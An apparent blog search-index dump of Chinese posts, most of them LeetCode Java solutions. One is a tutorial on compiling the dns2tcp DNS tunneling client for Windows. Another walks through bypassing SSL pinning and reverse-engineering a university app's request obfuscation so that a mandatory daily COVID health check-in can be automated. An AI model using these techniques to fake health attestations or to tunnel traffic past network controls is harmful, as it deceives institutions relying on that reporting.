    <content type="text"><![CDATA[本文仅供学习交流使用，如作他用所承受的任何直接、间接法律责任一概与作者无关 前言 由于疫情原因，学校要求新生在到校报到前14天（2020年8月27日至2020年9月10日期间），每日登陆【智慧成信APP】在【健康打卡】项目中完成健康打卡。这重复又无聊的任务实在是烦不胜烦，于是尝试自动化，因此这篇文章诞生了（o(╥﹏╥)o拖了很久才写） 准备工具及用途 jadx用于分析apk的源代码 fiddler用于抓包，分析网络请求接口 逍遥安卓模拟器 7.1用于配合fiddler抓包 xposed用于配合模拟器突破ssl pinning机制 justtrustme.apk用于配合模拟器突破ssl pinning机制 开始配置jadx请参考之前的文章 配置fiddler请参考之前的文章 配置逍遥安卓模拟器请参考之前的文章，注意：这篇文章使用的模拟器的安卓版本是Android 7.1 然后将智慧成信APP安装到模拟器 智慧成信APP下载地址：http://im.cuit.edu.cn/blade-platform/file/20200819/20200819184604-%E6%99%BA%E6%85%A7%E6%88%90%E4%BF%A1%20V1.0.1.apk 逆向 打开jadx-gui，直接把下载好的apk文件丢进去 文本搜索，直接搜索加密，幸运的是只有一个结果，(^▽^)（嘘，我悄悄说一句：其实我走了不少弯路，然后这里告诉大家的是最直接的方式，可以理解为我直接告诉了大家——捷径） 双击，查看源代码 可以很明显的看得出来，OneStepHttpConstant的oneStepDecode方法是在做解密操作了，跳过去看看 可以看到，加密解密都是通过这个类来完成的，对应的方法分别是oneStepEncode和oneStepDecode，也可以大概看得出来APP加密的思路：整体就是一个base64编码，然后分为两段，前10位是格式化的字符串，&quot;不足十位补的0 + 加密前字符串的长度&quot;，后面的是&quot;加密前字符串&quot;编码为base64之后再每隔几位插入一个随机字符 依样画葫芦，我们可以用python模仿写出下面这样的加密解密代码，（嘘，其实这段代码不是模仿APP中的Java代码写出来的，而是分析网页端的js，模仿而来的，因为使用APP的过程中，我们可以很明显的发现，智慧成信其实就是一个套壳的APP，而经过进一步的分析，最后可以得出这APP其实就是一个vue项目打包出来的套壳APP的结论） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import mathimport jsonimport randomimport base64# 判断是否是json字符串def isJson(s): try: jsonObj = json.loads(s) except: return False else: return True# 解密def decode(s): t = int(s[0:10]) n = list(s[10:]) a = 0 o = 0 while o &lt; math.floor(t / 100) + 1: n.pop(100 * o + 1 - a) a += 1 o += 1 return base64.b64decode(''.join(n)).decode()# 加密def encode(n): if not isJson(n): n = json.dumps(n) return o(n) + i(n)def o(e): t = str(int(len(e))) n = 10 - len(t) while n &gt; 0: t = '0' + t n -= 1 return tdef i(e, charset='utf-8'): t = list(str(base64.b64encode(e.encode(charset)), charset)) n = 0 while n &lt; math.floor(len(e) / 100 + 1): t.insert(100 * n + 1, str(math.floor(10 * random.random()))) n += 1 return ''.join(t) 附上分析vue项目得到的js加密解密源码 1234567891011121314151617181920212223242526function i(e, t) &#123; if (!e) return e; if (&quot;number&quot; == typeof e &amp;&amp; (e = &quot;&quot; + e), e instanceof Object) &#123; var n = JSON.stringify(e); return r(n) + o(n) &#125; if (&quot;string&quot; == typeof e) return r(e) + o(e); throw new Error(&quot;该数据不适合加密&quot; + t) &#125; function r(e) &#123; for (var t = e.length.toString(), n = 10 - t.length; n &gt; 0; n--) t = &quot;0&quot; + t; return t &#125; function o(e) &#123; for (var t = a.Base64.encode(e).split(&quot;&quot;), n = 0; n &lt; Math.floor(e.length / 100 + 1); n++) t.splice( 100 * n + 1, 0, Math.floor(10 * Math.random())); return t.join(&quot;&quot;) &#125; function s(e) &#123; if (!e) return e; for (var t = Number(e.substr(0, 10)), n = e.substr(10).split(&quot;&quot;), i = 0, r = 0; r &lt; Math.floor(t / 100) + 1; r++) n.splice(100 * r + 1 - i, 1), i++; var o = a.Base64.decode(n.join(&quot;&quot;)); return o.startsWith(&quot;&#123;&quot;) || o.startsWith(&quot;[&quot;) ? JSON.parse(o) : o.startsWith(&apos;&quot;&apos;) ? o.substring(1, o.length - 1) : o &#125; 拿出fiddler抓到的加密后的字符串，来验证一下我们的算法 10000000071e0yJhcHBUeXBlIjoiMiIsInNlcnZpY2VDb2RlIjoiMiIsInVzZXJfaW5mb19pZCI6IiIsInVzZXJfaW5mb19uYW1lIjoiIn0\u003d 正确的得到了解密后的结果 1&#123;&quot;appType&quot;:&quot;2&quot;,&quot;serviceCode&quot;:&quot;2&quot;,&quot;user_info_id&quot;:&quot;&quot;,&quot;user_info_name&quot;:&quot;&quot;&#125; 分析出了智慧成信APP的加密解密算法之后，接下来的一切就很简单了，附上智慧成信自动打卡项目，GitHub传送门 enjoy it!!!]]></content>
      <categories>
        <category>爬虫</category>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
        <tag>抓包</tag>
        <tag>fiddler</tag>
        <tag>智慧成信</tag>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/9/30]]></title>
    <url>%2Fposts%2Fe7f754ed%2F</url>
    <content type="text"><![CDATA[题目：701. 二叉搜索树中的插入操作难度：中等 给定二叉搜索树（BST）的根节点和要插入树中的值，将值插入二叉搜索树。 返回插入后二叉搜索树的根节点。 输入数据保证，新值和原始二叉搜索树中的任意节点值都不同。 注意，可能存在多种有效的插入方式，只要树在插入后仍保持为二叉搜索树即可。 你可以返回任意有效的结果。 例如, 123456789给定二叉搜索树: 4 / \ 2 7 / \ 1 3和 插入的值: 5 你可以返回这个二叉搜索树: 12345 4 / \ 2 7 / \ /1 3 5 或者这个树也是有效的: 1234567 5 / \ 2 7 / \ 1 3 \ 4 提示： 给定的树上的节点数介于 0 和 10^4 之间 每个节点都有一个唯一整数值，取值范围从 0 到 10^8 -10^8 &lt;= val &lt;= 10^8 新值和原始二叉搜索树中的任意节点值都不同 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/insert-into-a-binary-search-tree著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 搜索一次二叉搜素树，找到插入的位置，插入即可 解题代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849/** * Definition for a binary tree node. * public class TreeNode &#123; * int val; * TreeNode left; * TreeNode right; * TreeNode() &#123;&#125; * TreeNode(int val) &#123; this.val = val; &#125; * TreeNode(int val, TreeNode left, TreeNode right) &#123; * this.val = val; * this.left = left; * this.right = right; * &#125; * &#125; */class Solution &#123; public TreeNode insertIntoBST(TreeNode root, int val) &#123; if (root == null) &#123; root = new TreeNode(val); return root; &#125; dfs(root,val); if (node.val &lt; val) &#123; node.right = new TreeNode(val); &#125; else &#123; node.left = new TreeNode(val); &#125; return root; &#125; TreeNode node = null; private void dfs(TreeNode root,int val) &#123; if (root == null) &#123; return; &#125; node = root; if (root.val &lt; val) &#123; dfs(root.right,val); &#125; else &#123; dfs(root.left,val); &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>树</tag>
        <tag>二叉树</tag>
        <tag>二叉搜索树</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/9/29]]></title>
    <url>%2Fposts%2F8730dd08%2F</url>
    <content type="text"><![CDATA[题目：145. 二叉树的后序遍历难度：中等 给定一个二叉树，返回它的 后序 遍历。 示例: 12345678输入: [1,null,2,3] 1 \ 2 / 3 输出: [3,2,1] 进阶: 递归算法很简单，你可以通过迭代算法完成吗？ 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/binary-tree-postorder-traversal著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 二叉树的遍历 没什么好说了 一顿操作猛如虎 解题代码12345678910111213141516171819202122232425262728293031323334/** * Definition for a binary tree node. * public class TreeNode &#123; * int val; * TreeNode left; * TreeNode right; * TreeNode() &#123;&#125; * TreeNode(int val) &#123; this.val = val; &#125; * TreeNode(int val, TreeNode left, TreeNode right) &#123; * this.val = val; * this.left = left; * this.right = right; * &#125; * &#125; */class Solution &#123; public List&lt;Integer&gt; postorderTraversal(TreeNode root) &#123; dfs(root); return ans; &#125; List&lt;Integer&gt; ans = new ArrayList&lt;&gt;(); private void dfs(TreeNode root) &#123; if (root == null) &#123; return; &#125; dfs(root.left); dfs(root.right); ans.add(root.val); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>树</tag>
        <tag>二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows下编译dns2tcp]]></title>
    <url>%2Fposts%2Fb33186a1%2F</url>
    <content type="text"><![CDATA[dns2tcp简介dns2tcp是一款在linux下使用C语言开发的建立dns隧道的开源工具，项目开源地址：https://github.com/alex-sector/dns2tcp 目标用源代码编译出可在windows下运行的dns2tcp的客户端 工具 git Dev C++ 开始 安装git 安装Dev C++ 将Dev C++自带的mingw64的工具目录加入到path环境变量中 在你喜欢的目录，右键，git bash here ，clone 项目到本地 1git clone https://github.com/alex-sector/dns2tcp.git 进入到dns2tcp目录 1cd dns2tcp 执行configure，生成MakeFile，等待命令执行完成之后，进入下一步 1./configure 进入到client目录 1cd client make，在Dev C++自带的mingw64的工具中叫mingw32-make 1mingw32-make 不出意外的话，client目录下应该会出现编译好的dns2tcpc.exe文件 enjoy it!!!]]></content>
      <categories>
        <category>windows</category>
      </categories>
      <tags>
        <tag>dns2tcp</tag>
        <tag>windows</tag>
        <tag>编译</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/9/28]]></title>
    <url>%2Fposts%2Ff037ed9e%2F</url>
    <content type="text"><![CDATA[题目：117. 填充每个节点的下一个右侧节点指针 II难度：中等 给定一个二叉树 123456struct Node &#123; int val; Node *left; Node *right; Node *next;&#125; 填充它的每个 next 指针，让这个指针指向其下一个右侧节点。如果找不到下一个右侧节点，则将 next 指针设置为 NULL。 初始状态下，所有 next 指针都被设置为 NULL。 进阶： 你只能使用常量级额外空间。 使用递归解题也符合要求，本题中递归程序占用的栈空间不算做额外的空间复杂度。 示例： 123输入：root = [1,2,3,4,5,null,7]输出：[1,#,2,3,#,4,5,7,#]解释：给定二叉树如图 A 所示，你的函数应该填充它的每个 next 指针，以指向其下一个右侧节点，如图 B 所示。 提示： 树中的节点数小于 6000 -100 &lt;= node.val &lt;= 100 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/populating-next-right-pointers-in-each-node-ii著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 按层遍历二叉树即可 解题代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455/*// Definition for a Node.class Node &#123; public int val; public Node left; public Node right; public Node next; public Node() &#123;&#125; public Node(int _val) &#123; val = _val; &#125; public Node(int _val, Node _left, Node _right, Node _next) &#123; val = _val; left = _left; right = _right; next = _next; &#125;&#125;;*/class Solution &#123; public Node connect(Node root) &#123; if (root == null) &#123; return null; &#125; Queue&lt;Node&gt; q = new LinkedList&lt;&gt;(); q.add(root); while (!q.isEmpty()) &#123; int size = q.size(); while (size-- &gt; 0) &#123; Node p = q.poll(); if (size &gt; 0) &#123; p.next = q.element(); &#125; else &#123; p.next = null; &#125; if (p.left != null) &#123; q.add(p.left); &#125; if (p.right != null) &#123; q.add(p.right); &#125; &#125; &#125; return root; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>树</tag>
        <tag>二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/9/27]]></title>
    <url>%2Fposts%2F6088f00f%2F</url>
    <content type="text"><![CDATA[题目：235. 二叉搜索树的最近公共祖先难度：简单 给定一个二叉搜索树, 找到该树中两个指定节点的最近公共祖先。 百度百科中最近公共祖先的定义为：“对于有根树 T 的两个结点 p、q，最近公共祖先表示为一个结点 x，满足 x 是 p、q 的祖先且 x 的深度尽可能大（一个节点也可以是它自己的祖先）。” 例如，给定如下二叉搜索树: root = [6,2,8,0,4,7,9,null,null,3,5] 示例 1: 123输入: root = [6,2,8,0,4,7,9,null,null,3,5], p = 2, q = 8输出: 6 解释: 节点 2 和节点 8 的最近公共祖先是 6。 示例 2: 123输入: root = [6,2,8,0,4,7,9,null,null,3,5], p = 2, q = 4输出: 2解释: 节点 2 和节点 4 的最近公共祖先是 2, 因为根据定义最近公共祖先节点可以为节点本身。 说明: 所有节点的值都是唯一的。 p、q 为不同节点且均存在于给定的二叉搜索树中。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/lowest-common-ancestor-of-a-binary-search-tree著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 利用二叉搜索树的性质：左子树一定比根结点小，右子树一定比根结点大，分情况递归搜索即可 解题代码123456789101112131415161718192021222324252627/** * Definition for a binary tree node. * public class TreeNode &#123; * int val; * TreeNode left; * TreeNode right; * TreeNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public TreeNode lowestCommonAncestor(TreeNode root, TreeNode p, TreeNode q) &#123; if (root == null) &#123; return null; &#125; if (root.val &lt; p.val &amp;&amp; root.val &lt; q.val) &#123; return lowestCommonAncestor(root.right, p, q); &#125; if (root.val &gt; p.val &amp;&amp; root.val &gt; q.val) &#123; return lowestCommonAncestor(root.left, p, q); &#125; return root; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>树</tag>
        <tag>二叉树</tag>
        <tag>二叉搜索树</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/9/26]]></title>
    <url>%2Fposts%2F178fc099%2F</url>
    <content type="text"><![CDATA[题目：113. 路径总和 II难度：中等 给定一个二叉树和一个目标和，找到所有从根节点到叶子节点路径总和等于给定目标和的路径。 说明: 叶子节点是指没有子节点的节点。 示例:给定如下二叉树，以及目标和 sum = 22， 1234567 5 / \ 4 8 / / \ 11 13 4 / \ / \7 2 5 1 返回: 1234[ [5,4,11,2], [5,8,4,5]] 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/path-sum-ii著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 从根结点回溯搜索到叶子结点，判断是否得到目标和即可 解题代码123456789101112131415161718192021222324252627282930313233343536373839/** * Definition for a binary tree node. * public class TreeNode &#123; * int val; * TreeNode left; * TreeNode right; * TreeNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public List&lt;List&lt;Integer&gt;&gt; pathSum(TreeNode root, int sum) &#123; dfs(root,sum,new ArrayList&lt;&gt;()); return ans; &#125; List&lt;List&lt;Integer&gt;&gt; ans = new ArrayList&lt;&gt;(); private void dfs(TreeNode root,int sum,List&lt;Integer&gt; tmp) &#123; if (root == null) &#123; return; &#125; tmp.add(root.val); if (root.left == null &amp;&amp; root.right == null) &#123; int s = 0; for (int i : tmp) &#123; s += i; &#125; if (s == sum) &#123; ans.add(new ArrayList&lt;&gt;(tmp)); &#125; &#125; dfs(root.left,sum,tmp); dfs(root.right,sum,tmp); tmp.remove(tmp.size() - 1); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>深度优先搜索</tag>
        <tag>dfs</tag>
        <tag>树</tag>
        <tag>二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/9/25]]></title>
    <url>%2Fposts%2F8e869123%2F</url>
    <content type="text"><![CDATA[题目：106. 从中序与后序遍历序列构造二叉树难度：中等 根据一棵树的中序遍历与后序遍历构造二叉树。 注意:你可以假设树中没有重复的元素。 例如，给出 12中序遍历 inorder = [9,3,15,20,7]后序遍历 postorder = [9,15,7,20,3] 返回如下的二叉树： 12345 3 / \9 20 / \ 15 7 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/construct-binary-tree-from-inorder-and-postorder-traversal著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 从后序序列中拿出最后一个作为根结点，然后在中序序列中找到根结点的位置，按根结点的位置划分中序序列，前面是左子树的中序序列，后面是右子树的中序序列，然后利用划分好的中序序列的长度划分后序序列，递归的构造左右子树即可 解题代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051/** * Definition for a binary tree node. * public class TreeNode &#123; * int val; * TreeNode left; * TreeNode right; * TreeNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public TreeNode buildTree(int[] inorder, int[] postorder) &#123; if (inorder.length &lt; 1) &#123; return null; &#125; if (inorder.length == 1) &#123; return new TreeNode(inorder[0]); &#125; // 构造根结点 int rootVal = postorder[postorder.length - 1]; TreeNode root = new TreeNode(rootVal); // 找到根结点在中序序列中的位置 int l = -1; for (int i = 0;i &lt; inorder.length;i++) &#123; if (inorder[i] == rootVal) &#123; l = i; break; &#125; &#125; // 划分左右子树的中序序列 int[] lInorder = Arrays.copyOfRange(inorder,0,l); int[] rInorder = Arrays.copyOfRange(inorder,l + 1,inorder.length); // System.out.println(Arrays.toString(lInorder)); // System.out.println(Arrays.toString(rInorder)); // 划分左右子树的后序序列 int[] lPostorder = Arrays.copyOfRange(postorder,0,lInorder.length); int[] rPostorder = Arrays.copyOfRange(postorder,lInorder.length,postorder.length - 1); // System.out.println(Arrays.toString(lPostorder)); // System.out.println(Arrays.toString(rPostorder)); // 递归的构造左右子树 root.left = buildTree(lInorder,lPostorder); root.right = buildTree(rInorder,rPostorder); return root; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>深度优先搜索</tag>
        <tag>dfs</tag>
        <tag>树</tag>
        <tag>二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/9/24]]></title>
    <url>%2Fposts%2Ff981a1b5%2F</url>
    <content type="text"><![CDATA[题目：501. 二叉搜索树中的众数难度：简单 给定一个有相同值的二叉搜索树（BST），找出 BST 中的所有众数（出现频率最高的元素）。 假定 BST 有如下定义： 结点左子树中所含结点的值小于等于当前结点的值 结点右子树中所含结点的值大于等于当前结点的值 左子树和右子树都是二叉搜索树 例如：给定 BST [1,null,2,2], 123456 1 \ 2 / 2返回[2]. 提示：如果众数超过1个，不需考虑输出顺序 进阶：你可以不使用额外的空间吗？（假设由递归产生的隐式调用栈的开销不被计算在内） 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/find-mode-in-binary-search-tree著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 不会优化，暴力计数，能A但效率低 解题代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253/** * Definition for a binary tree node. * public class TreeNode &#123; * int val; * TreeNode left; * TreeNode right; * TreeNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public int[] findMode(TreeNode root) &#123; dfs(root); int max = 0; for (int k : map.keySet()) &#123; int v = map.get(k); if (v &gt; max) &#123; max = v; &#125; &#125; List&lt;Integer&gt; ans = new ArrayList&lt;&gt;(); for (int k : map.keySet()) &#123; int v = map.get(k); if (v == max) &#123; ans.add(k); &#125; &#125; int[] a = new int[ans.size()]; for (int i = 0;i &lt; ans.size();i++) &#123; a[i] = ans.get(i); &#125; return a; &#125; Map&lt;Integer,Integer&gt; map = new HashMap&lt;&gt;(); private void dfs(TreeNode root) &#123; if (root == null) &#123; return; &#125; dfs(root.left); int k = root.val; if (map.containsKey(k)) &#123; map.put(k,map.get(k) + 1); &#125; else &#123; map.put(k,1); &#125; dfs(root.right); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>树</tag>
        <tag>二叉树</tag>
        <tag>二叉搜索树</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/9/23]]></title>
    <url>%2Fposts%2F67e53416%2F</url>
    <content type="text"><![CDATA[题目：617. 合并二叉树难度：简单 给定两个二叉树，想象当你将它们中的一个覆盖到另一个上时，两个二叉树的一些节点便会重叠。 你需要将他们合并为一个新的二叉树。合并的规则是如果两个节点重叠，那么将他们的值相加作为节点合并后的新值，否则不为 NULL 的节点将直接作为新二叉树的节点。 示例 1: 1234567891011121314输入: Tree 1 Tree 2 1 2 / \ / \ 3 2 1 3 / \ \ 5 4 7 输出: 合并后的树: 3 / \ 4 5 / \ \ 5 4 7 注意: 合并必须从两个树的根节点开始。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/merge-two-binary-trees著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 如果两颗二叉树能合并，那么必定有一部分节点是相同的，所以我们可以任意选一颗树作为合并后的树，于是不妨将t2合并到t1，然后同时深度遍历这两棵树，此时有两种情况，第一是两棵树节点结构相同，那么将值加到t1的节点，第二是节点结构不相同（t1或者t2没有对应的节点），那么将有节点的部分赋值给t1即可 解题代码123456789101112131415161718192021222324/** * Definition for a binary tree node. * public class TreeNode &#123; * int val; * TreeNode left; * TreeNode right; * TreeNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public TreeNode mergeTrees(TreeNode t1, TreeNode t2) &#123; if (t1 != null &amp;&amp; t2 != null) &#123; t1.val += t2.val; t1.left = mergeTrees(t1.left,t2.left); t1.right = mergeTrees(t1.right,t2.right); &#125; if (t1 == null) &#123; return t2; &#125; return t1; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>树</tag>
        <tag>二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/9/21]]></title>
    <url>%2Fposts%2F89eb553a%2F</url>
    <content type="text"><![CDATA[题目：538. 把二叉搜索树转换为累加树难度：简单 给定一个二叉搜索树（Binary Search Tree），把它转换成为累加树（Greater Tree)，使得每个节点的值是原来的节点值加上所有大于它的节点值之和。 例如： 123456789输入: 原始二叉搜索树: 5 / \ 2 13输出: 转换为累加树: 18 / \ 20 13 注意：本题和 1038: https://leetcode-cn.com/problems/binary-search-tree-to-greater-sum-tree/ 相同 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/convert-bst-to-greater-tree著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 反中序遍历（RCL）二叉搜索树即可 解题代码123456789101112131415161718192021222324252627/** * Definition for a binary tree node. * public class TreeNode &#123; * int val; * TreeNode left; * TreeNode right; * TreeNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public TreeNode convertBST(TreeNode root) &#123; dfs(root); return root; &#125; int sum = 0; private void dfs(TreeNode root) &#123; if (root == null) &#123; return; &#125; dfs(root.right); sum += root.val; root.val = sum; dfs(root.left); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>树</tag>
        <tag>二叉树</tag>
        <tag>二叉搜索树</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/9/20]]></title>
    <url>%2Fposts%2Ffeec65ac%2F</url>
    <content type="text"><![CDATA[题目：78. 子集难度：中等 给定一组不含重复元素的整数数组 nums，返回该数组所有可能的子集（幂集）。 说明：解集不能包含重复的子集。 示例: 123456789101112输入: nums = [1,2,3]输出:[ [3], [1], [2], [1,2,3], [1,3], [2,3], [1,2], []] 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/subsets著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 子集问题是相当经典的多分支回溯问题，针对每一个节点，都有两种情况，一种是选，另一种是不选，然后进行下一次搜索，这实际上是一颗递归树，搜索完这棵树的所有的分支之后，便可以得到解集 解题代码123456789101112131415161718192021222324252627282930class Solution &#123; public List&lt;List&lt;Integer&gt;&gt; subsets(int[] nums) &#123; dfs(nums,new boolean[nums.length],0); return ans; &#125; List&lt;List&lt;Integer&gt;&gt; ans = new ArrayList&lt;&gt;(); private void dfs(int[] nums,boolean[] choosed,int c) &#123; if (c &gt;= nums.length) &#123; // System.out.println(Arrays.toString(choosed)); List&lt;Integer&gt; one = new ArrayList&lt;&gt;(); for (int i = 0;i &lt; choosed.length;i++) &#123; if (choosed[i]) &#123; one.add(nums[i]); &#125; &#125; ans.add(one); return; &#125; choosed[c] = true; dfs(nums,choosed,c + 1); choosed[c] = false; dfs(nums,choosed,c + 1); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>回溯算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/9/19]]></title>
    <url>%2Fposts%2Fac1d8ecb%2F</url>
    <content type="text"><![CDATA[题目：404. 左叶子之和难度：简单 计算给定二叉树的所有左叶子之和。 示例： 1234567 3 / \ 9 20 / \ 15 7在这个二叉树中，有两个左叶子，分别是 9 和 15，所以返回 24 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/sum-of-left-leaves著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 dfs搜索到所有的左叶子节点，然后把值累加起来即可 解题代码12345678910111213141516171819202122232425262728293031/** * Definition for a binary tree node. * public class TreeNode &#123; * int val; * TreeNode left; * TreeNode right; * TreeNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public int sumOfLeftLeaves(TreeNode root) &#123; dfs(root); return ans; &#125; int ans = 0; private void dfs(TreeNode root) &#123; if (root == null) &#123; return; &#125; TreeNode left = root.left; if (left != null &amp;&amp; left.left == null &amp;&amp; left.right == null) &#123; ans += left.val; &#125; dfs(left); dfs(root.right); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>树</tag>
        <tag>二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/9/18]]></title>
    <url>%2Fposts%2Fdb1abe5d%2F</url>
    <content type="text"><![CDATA[题目：47. 全排列 II难度：中等 给定一个可包含重复数字的序列，返回所有不重复的全排列。 示例: 1234567输入: [1,1,2]输出:[ [1,1,2], [1,2,1], [2,1,1]] 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/permutations-ii著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 回溯法可以全排列，没有重复数字的全排列直接交换就行，有重复数字的全排列需要考虑重复的情况，可以在交换之前判断数字是否相同，也可以使用set暴力去重，当然，前者效率更高 解题代码12345678910111213141516171819202122232425262728293031323334353637383940414243class Solution &#123; List&lt;List&lt;Integer&gt;&gt; ans = new ArrayList&lt;&gt;(); public List&lt;List&lt;Integer&gt;&gt; permuteUnique(int[] nums) &#123; dfs(nums,0); return ans; &#125; private void dfs(int[] nums,int cur) &#123; if (cur == nums.length) &#123; List&lt;Integer&gt; line = new ArrayList&lt;&gt;(); for (int i : nums) &#123; line.add(i); &#125; ans.add(line); return; &#125; for (int i = cur;i &lt; nums.length;i++) &#123; if (canSwap(nums,cur,i)) &#123; swap(nums,cur,i); dfs(nums,cur + 1); swap(nums,cur,i); &#125; &#125; &#125; private boolean canSwap(int nums[],int begin,int end) &#123; for (int i = begin;i &lt; end;i++) &#123; if (nums[i] == nums[end]) &#123; return false; &#125; &#125; return true; &#125; private void swap(int nums[],int i,int j) &#123; int temp = nums[i]; nums[i] = nums[j]; nums[j] = temp; &#125;&#125; set暴力去重 123456789101112131415161718192021222324252627282930class Solution &#123; Set&lt;List&lt;Integer&gt;&gt; set = new HashSet&lt;&gt;(); public List&lt;List&lt;Integer&gt;&gt; permuteUnique(int[] nums) &#123; dfs(nums,0); List&lt;List&lt;Integer&gt;&gt; ans = new ArrayList&lt;&gt;(set); return ans; &#125; private void dfs(int[] nums,int cur) &#123; if (cur == nums.length) &#123; List&lt;Integer&gt; line = new ArrayList&lt;&gt;(); for (int i : nums) &#123; line.add(i); &#125; set.add(line); &#125; else &#123; for (int i = cur;i &lt; nums.length;i++) &#123; swap(nums,cur,i); dfs(nums,cur + 1); swap(nums,cur,i); &#125; &#125; &#125; private void swap(int nums[],int i,int j) &#123; int temp = nums[i]; nums[i] = nums[j]; nums[j] = temp; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>回溯算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jupyter初体验]]></title>
    <url>%2Fposts%2F952deeaf%2F</url>
